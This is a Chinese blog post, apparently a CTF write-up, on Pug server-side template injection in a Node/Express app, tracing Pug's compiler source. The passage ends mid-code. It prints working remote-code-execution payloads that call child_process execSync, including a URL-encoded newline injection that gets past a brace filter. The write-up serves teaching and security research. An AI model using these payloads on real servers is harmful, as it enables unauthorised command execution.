{"title":"Pug SSTI","date":"2023-03-13T15:27:42.000Z","date_formatted":{"ll":"Mar 13, 2023","L":"03/13/2023","MM-DD":"03-13"},"link":"2023/03/13/Pug-SSTI","tags":["CVEs"],"updated":"2023-03-15T11:35:08.316Z","content":"<p>寫這篇的原因是因為 AIS3 EOF Final 2022 剛好有出這題的進化版，想說就<s>水</s>寫一篇醬～</p>\n<span id=\"more\"></span>\n<h2 id=\"pug-ssti\">Pug SSTI<a title=\"#pug-ssti\" href=\"#pug-ssti\"></a></h2>\n<ul>\n<li>這邊先給一下題目最原始的版本</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;express&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> pug = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;pug&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> app = <span class=\"title function_\">express</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> template = <span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">h1 Hello %NAME%</span></span><br><span class=\"line\"><span class=\"string\">form(method=&#x27;GET&#x27; action=&#x27;/&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">  div</span></span><br><span class=\"line\"><span class=\"string\">    label(for=&#x27;nickname&#x27;) Name:</span></span><br><span class=\"line\"><span class=\"string\">    input#nickname(type=&#x27;text&#x27;, placeholder=&#x27;Nickname&#x27; name=&#x27;name&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">    button(type=&#x27;submit&#x27;) Submit </span></span><br><span class=\"line\"><span class=\"string\">  a(href=&#x27;/source&#x27;) Source Code</span></span><br><span class=\"line\"><span class=\"string\">`</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> name = (req.<span class=\"property\">query</span>.<span class=\"property\">name</span> ?? <span class=\"string\">&#x27;Anonymous&#x27;</span>).<span class=\"title function_\">toString</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (name.<span class=\"title function_\">includes</span>(<span class=\"string\">&#x27;&#123;&#x27;</span>)) <span class=\"keyword\">return</span> res.<span class=\"title function_\">send</span>(<span class=\"string\">&#x27;Nice try&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> html = pug.<span class=\"title function_\">render</span>(template.<span class=\"title function_\">replace</span>(<span class=\"string\">&#x27;%NAME%&#x27;</span>, name));</span><br><span class=\"line\">    res.<span class=\"title function_\">set</span>(<span class=\"string\">&#x27;Content-Type&#x27;</span>, <span class=\"string\">&#x27;text/html&#x27;</span>);</span><br><span class=\"line\">    res.<span class=\"title function_\">send</span>(html);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">get</span>(<span class=\"string\">&quot;/source&quot;</span>, <span class=\"function\">(<span class=\"params\">_, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    res.<span class=\"title function_\">sendFile</span>(__filename);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">listen</span>(<span class=\"number\">3000</span>, <span class=\"function\">() =&gt;</span> <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;:3000&#x27;</span>));</span><br></pre></td></tr></table></figure>\n<ul>\n<li>可以看到有一行有檢查 <code>name</code> 有沒有包含 <code>&#123;</code></li>\n<li>先簡化一下這一題，把那行拿掉就會變成最簡單的 SSTI</li>\n</ul>\n<h3 id=\"pug-ssti-1\">Pug SSTI 1<a title=\"#pug-ssti-1\" href=\"#pug-ssti-1\"></a></h3>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;express&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> pug = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;pug&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> app = <span class=\"title function_\">express</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> template = <span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">h1 Hello %NAME%</span></span><br><span class=\"line\"><span class=\"string\">form(method=&#x27;GET&#x27; action=&#x27;/&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">  div</span></span><br><span class=\"line\"><span class=\"string\">    label(for=&#x27;nickname&#x27;) Name:</span></span><br><span class=\"line\"><span class=\"string\">    input#nickname(type=&#x27;text&#x27;, placeholder=&#x27;Nickname&#x27; name=&#x27;name&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">    button(type=&#x27;submit&#x27;) Submit </span></span><br><span class=\"line\"><span class=\"string\">  a(href=&#x27;/source&#x27;) Source Code</span></span><br><span class=\"line\"><span class=\"string\">`</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> name = (req.<span class=\"property\">query</span>.<span class=\"property\">name</span> ?? <span class=\"string\">&#x27;Anonymous&#x27;</span>).<span class=\"title function_\">toString</span>();</span><br><span class=\"line\">    <span class=\"keyword\">let</span> html = pug.<span class=\"title function_\">render</span>(template.<span class=\"title function_\">replace</span>(<span class=\"string\">&#x27;%NAME%&#x27;</span>, name));</span><br><span class=\"line\">    res.<span class=\"title function_\">set</span>(<span class=\"string\">&#x27;Content-Type&#x27;</span>, <span class=\"string\">&#x27;text/html&#x27;</span>);</span><br><span class=\"line\">    res.<span class=\"title function_\">send</span>(html);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">get</span>(<span class=\"string\">&quot;/source&quot;</span>, <span class=\"function\">(<span class=\"params\">_, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    res.<span class=\"title function_\">sendFile</span>(__filename);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">listen</span>(<span class=\"number\">3000</span>, <span class=\"function\">() =&gt;</span> <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;:3000&#x27;</span>));</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>之後來翻一下 pug 的 document</p>\n<ul>\n<li>\n<p><a href=\"https://pugjs.org/api/getting-started.html\" target=\"_blank\">https://pugjs.org/api/getting-started.html</a></p>\n</li>\n<li>\n<p>在 overview 裡面就有一個很大的提示</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//- template.pug</span></span><br><span class=\"line\">p #&#123;name&#125;<span class=\"string\">&#x27;s Pug source code!</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li>\n<p>這樣就可以 SSTI 了</p>\n</li>\n<li>\n<p>payload</p>\n</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">global</span>.<span class=\"property\">process</span>.<span class=\"property\">mainModule</span>.<span class=\"property\">constructor</span>.<span class=\"title function_\">_load</span>(<span class=\"string\">&#x27;child_process&#x27;</span>).<span class=\"title function_\">execSync</span>(<span class=\"string\">&#x27;id&#x27;</span>).<span class=\"title function_\">toString</span>()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>如果直接使用 <code>require(&quot;child_proccess&quot;)</code> 會噴</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">TypeError: require is not a function on line 2</span><br></pre></td></tr></table></figure>\n<ul>\n<li>來做一點 code review，先找一下 <code>__express</code> 的位置，至於為什麼要找這個東西可以參考\n<ul>\n<li><a href=\"https://entroychang.github.io/2023/03/06/NodeJS-template-CVEs#code-review\" target=\"_blank\">https://entroychang.github.io/2023/03/06/NodeJS-template-CVEs#code-review</a></li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">exports</span>.<span class=\"property\">__express</span> = <span class=\"keyword\">function</span>(<span class=\"params\">path, options, fn</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (</span><br><span class=\"line\">    options.<span class=\"property\">compileDebug</span> == <span class=\"literal\">undefined</span> &amp;&amp;</span><br><span class=\"line\">    process.<span class=\"property\">env</span>.<span class=\"property\">NODE_ENV</span> === <span class=\"string\">&#x27;production&#x27;</span></span><br><span class=\"line\">  ) &#123;</span><br><span class=\"line\">    options.<span class=\"property\">compileDebug</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">exports</span>.<span class=\"title function_\">renderFile</span>(path, options, fn);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ul>\n<li>繼續往後追他的 functions 呼叫</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">renderFile(path, options, fn)</span><br><span class=\"line\">-&gt; handleTemplateCache(options)(options)</span><br><span class=\"line\">   -&gt; compile(str, options)</span><br><span class=\"line\">      -&gt; compileBody</span><br><span class=\"line\">         -&gt; new Function(&#x27;&#x27;, parsed.body + &#x27;;return template;&#x27;)()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>可以看到上面 <code>compileBody</code> 完成之後會送到 <code>new Function()</code> 那個就是 <code>FunctionConstructor</code>，詳細的原因可以參考\n<ul>\n<li><a href=\"https://entroychang.github.io/2023/03/06/NodeJS-template-CVEs#%E8%B8%A9%E5%9D%91\" target=\"_blank\">https://entroychang.github.io/2023/03/06/NodeJS-template-CVEs#踩坑</a></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"pug-ssti-2\">Pug SSTI 2<a title=\"#pug-ssti-2\" href=\"#pug-ssti-2\"></a></h3>\n<ul>\n<li>\n<p>簡單地做完了，來把限制加回去</p>\n</li>\n<li>\n<p>這個時候可以發現上面的 payload 無法使用了，因此需要找其他的方式可以執行 code，繼續翻一下 document</p>\n<ul>\n<li>\n<p><a href=\"https://pugjs.org/language/code.html\" target=\"_blank\">https://pugjs.org/language/code.html</a></p>\n</li>\n<li>\n<p>可以清楚地看到說 pug 提供了一些方法可以在 template 裡面執行 js code</p>\n<blockquote>\n<p>Pug allows you to write inline JavaScript code in your templates. There are three types of code: Unbuffered, Buffered, and Unescaped Buffered.</p>\n</blockquote>\n</li>\n</ul>\n</li>\n<li>\n<p>如此就可以 RCE 了，不過要注意的是 <code>Unbuffered code starts with -</code> ，例如說</p>\n</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">h1 whatever</span><br><span class=\"line\">- <span class=\"variable constant_\">RCE</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>所以說要在 <code>%NAME%</code> 給一個換行，可以用下面的 payload 測試一下</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%0a-%20<span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"number\">123</span>)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>可以看到 terminal 中有 123 的輸出</li>\n</ul>\n</li>\n<li>\n<p>payload</p>\n</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%0a-%20<span class=\"keyword\">var</span>%20result%<span class=\"number\">20</span>=%20<span class=\"variable language_\">global</span>.<span class=\"property\">process</span>.<span class=\"property\">mainModule</span>.<span class=\"property\">constructor</span>.<span class=\"title function_\">_load</span>(%27child_process%<span class=\"number\">27</span>).<span class=\"title function_\">execSync</span>(%27id%<span class=\"number\">27</span>).<span class=\"title function_\">toString</span>()%0ah1=%20result</span><br></pre></td></tr></table></figure>\n<ul>\n<li>也可以簡化成</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%0ah1=%20<span class=\"variable language_\">global</span>.<span class=\"property\">process</span>.<span class=\"property\">mainModule</span>.<span class=\"property\">constructor</span>.<span class=\"title function_\">_load</span>(%27child_process%<span class=\"number\">27</span>).<span class=\"title function_\">execSync</span>(%27id%<span class=\"number\">27</span>).<span class=\"title function_\">toString</span>()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>還有其他可以利用的，例如說\n<ul>\n<li><a href=\"https://pugjs.org/language/interpolation.html#tag-interpolation\" target=\"_blank\">https://pugjs.org/language/interpolation.html#tag-interpolation</a></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"echo2\">echo2<a title=\"#echo2\" href=\"#echo2\"></a></h3>\n<ul>\n<li>這邊給一下 Cyku 大大的原始題目\n<ul>\n<li><a href=\"https://github.com/CykuTW/My-CTF-Challenges/tree/master/AIS3-EOF-CTF-2020-Final/echo2\" target=\"_blank\">https://github.com/CykuTW/My-CTF-Challenges/tree/master/AIS3-EOF-CTF-2020-Final/echo2</a></li>\n</ul>\n</li>\n<li>上面有 functions 呼叫的順序，基本上是一樣的，所以就快速地看到 <code>compile</code> 的部分</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> parsed = <span class=\"title function_\">compileBody</span>(str, &#123;</span><br><span class=\"line\">    <span class=\"attr\">compileDebug</span>: options.<span class=\"property\">compileDebug</span> !== <span class=\"literal\">false</span>,</span><br><span class=\"line\">    <span class=\"attr\">filename</span>: options.<span class=\"property\">filename</span>,</span><br><span class=\"line\">    <span class=\"attr\">basedir</span>: options.<span class=\"property\">basedir</span>,</span><br><span class=\"line\">    <span class=\"attr\">pretty</span>: options.<span class=\"property\">pretty</span>,</span><br><span class=\"line\">    <span class=\"attr\">doctype</span>: options.<span class=\"property\">doctype</span>,</span><br><span class=\"line\">    <span class=\"attr\">inlineRuntimeFunctions</span>: options.<span class=\"property\">inlineRuntimeFunctions</span>,</span><br><span class=\"line\">    <span class=\"attr\">globals</span>: options.<span class=\"property\">globals</span>,</span><br><span class=\"line\">    <span class=\"attr\">self</span>: options.<span class=\"property\">self</span>,</span><br><span class=\"line\">    <span class=\"attr\">includeSources</span>: options.<span class=\"property\">compileDebug</span> === <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"attr\">debug</span>: options.<span class=\"property\">debug</span>,</span><br><span class=\"line\">    <span class=\"attr\">templateName</span>: <span class=\"string\">&#x27;template&#x27;</span>,</span><br><span class=\"line\">    <span class=\"attr\">filters</span>: options.<span class=\"property\">filters</span>,</span><br><span class=\"line\">    <span class=\"attr\">filterOptions</span>: options.<span class=\"property\">filterOptions</span>,</span><br><span class=\"line\">    <span class=\"attr\">filterAliases</span>: options.<span class=\"property\">filterAliases</span>,</span><br><span class=\"line\">    <span class=\"attr\">plugins</span>: options.<span class=\"property\">plugins</span>,</span><br><span class=\"line\">  &#125;);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>可以看到有很多 <code>options</code> 可以控制，我們傳入的 object 其實就是 <code>options</code>，因此只要在上面的可以因為給予的參數進行污染導致後面在 compile 的時候拼接上惡意字串</p>\n<ul>\n<li>\n<p><code>text=1&amp;doctype=test</code></p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">options <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">  pretty<span class=\"punctuation\">:</span> undefined<span class=\"punctuation\">,</span></span><br><span class=\"line\">  compileDebug<span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  doctype<span class=\"punctuation\">:</span> &#x27;test&#x27;<span class=\"punctuation\">,</span></span><br><span class=\"line\">  inlineRuntimeFunctions<span class=\"punctuation\">:</span> undefined<span class=\"punctuation\">,</span></span><br><span class=\"line\">  globals<span class=\"punctuation\">:</span> undefined<span class=\"punctuation\">,</span></span><br><span class=\"line\">  self<span class=\"punctuation\">:</span> undefined<span class=\"punctuation\">,</span></span><br><span class=\"line\">  includeSources<span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">false</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  templateName<span class=\"punctuation\">:</span> &#x27;template&#x27;</span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li>\n<p>在 <code>/usr/src/app/node_modules/pug-code-gen/index.js</code> 中的 <code>Compiler(node, options)</code> 有可控的參數，這個時候需要研究一下什麼參數是可以直接被拼接到最後 compile 的 code 裡面</p>\n</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Compiler</span>(<span class=\"params\">node, options</span>) &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">options</span> = options = options || &#123;&#125;;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">node</span> = node;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">bufferedConcatenationCount</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">hasCompiledDoctype</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">hasCompiledTag</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">pp</span> = options.<span class=\"property\">pretty</span> || <span class=\"literal\">false</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">pp</span> &amp;&amp; <span class=\"keyword\">typeof</span> <span class=\"variable language_\">this</span>.<span class=\"property\">pp</span> !== <span class=\"string\">&#x27;string&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">pp</span> = <span class=\"string\">&#x27;  &#x27;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">debug</span> = <span class=\"literal\">false</span> !== options.<span class=\"property\">compileDebug</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">indents</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">parentIndents</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">terse</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">mixins</span> = &#123;&#125;;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">dynamicMixins</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">eachCount</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (options.<span class=\"property\">doctype</span>) <span class=\"variable language_\">this</span>.<span class=\"title function_\">setDoctype</span>(options.<span class=\"property\">doctype</span>);</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">runtimeFunctionsUsed</span> = [];</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">inlineRuntimeFunctions</span> = options.<span class=\"property\">inlineRuntimeFunctions</span> || <span class=\"literal\">false</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">debug</span> &amp;&amp; <span class=\"variable language_\">this</span>.<span class=\"property\">inlineRuntimeFunctions</span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">runtimeFunctionsUsed</span>.<span class=\"title function_\">push</span>(<span class=\"string\">&#x27;rethrow&#x27;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>仔細觀察上面的參數可以發現真的有吃字串的好像只有 <code>this.pp</code> 其他的好像不是 true false 就是數字</li>\n<li>找一下有 <code>this.pp</code> 的 functions 中 <code>visitMixinBlock</code> 跟 <code>visitMixin</code> 比較可疑，順帶一提 <code>prettyIndent</code> 這個 function 裡面有 call <code>Buffer</code> 有加上 <code>str = stringify(str);</code> 可以過濾字串所以是安全的</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">visitMixinBlock</span>: <span class=\"keyword\">function</span>(<span class=\"params\">block</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">pp</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">buf</span>.<span class=\"title function_\">push</span>(</span><br><span class=\"line\">      <span class=\"string\">&quot;pug_indent.push(&#x27;&quot;</span> + <span class=\"title class_\">Array</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">indents</span> + <span class=\"number\">1</span>).<span class=\"title function_\">join</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">pp</span>) + <span class=\"string\">&quot;&#x27;);&quot;</span></span><br><span class=\"line\">    );</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">buf</span>.<span class=\"title function_\">push</span>(<span class=\"string\">&#x27;block &amp;&amp; block();&#x27;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">pp</span>) <span class=\"variable language_\">this</span>.<span class=\"property\">buf</span>.<span class=\"title function_\">push</span>(<span class=\"string\">&#x27;pug_indent.pop();&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>可以看到他是直接把 <code>this.pp</code> push 到 <code>this.buf</code> 裡面沒有任何過濾</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">visitMixin</span>: <span class=\"keyword\">function</span>(<span class=\"params\">mixin</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> name = <span class=\"string\">&#x27;pug_mixins[&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> args = mixin.<span class=\"property\">args</span> || <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> block = mixin.<span class=\"property\">block</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> attrs = mixin.<span class=\"property\">attrs</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> attrsBlocks = <span class=\"variable language_\">this</span>.<span class=\"title function_\">attributeBlocks</span>(mixin.<span class=\"property\">attributeBlocks</span>);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> pp = <span class=\"variable language_\">this</span>.<span class=\"property\">pp</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> dynamic = mixin.<span class=\"property\">name</span>[<span class=\"number\">0</span>] === <span class=\"string\">&#x27;#&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> key = mixin.<span class=\"property\">name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (dynamic) <span class=\"variable language_\">this</span>.<span class=\"property\">dynamicMixins</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    name +=</span><br><span class=\"line\">      (dynamic</span><br><span class=\"line\">        ? mixin.<span class=\"property\">name</span>.<span class=\"title function_\">substr</span>(<span class=\"number\">2</span>, mixin.<span class=\"property\">name</span>.<span class=\"property\">length</span> - <span class=\"number\">3</span>)</span><br><span class=\"line\">        : <span class=\"string\">&#x27;&quot;&#x27;</span> + mixin.<span class=\"property\">name</span> + <span class=\"string\">&#x27;&quot;&#x27;</span>) + <span class=\"string\">&#x27;]&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">mixins</span>[key] = <span class=\"variable language_\">this</span>.<span class=\"property\">mixins</span>[key] || &#123;<span class=\"attr\">used</span>: <span class=\"literal\">false</span>, <span 